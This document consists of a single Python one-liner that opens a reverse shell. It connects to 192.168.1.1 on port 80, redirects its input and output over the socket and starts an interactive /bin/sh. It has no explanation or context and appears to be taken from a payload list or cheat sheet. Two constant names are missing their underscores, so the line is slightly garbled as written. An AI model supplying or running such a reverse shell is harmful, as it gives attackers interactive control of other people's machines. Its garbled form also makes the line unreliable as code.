python -c 'import socket,subprocess,os;s=socket.socket(socket.AF INET,socket.SOCK STREAM);s.connect(("192.168.1.1",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);


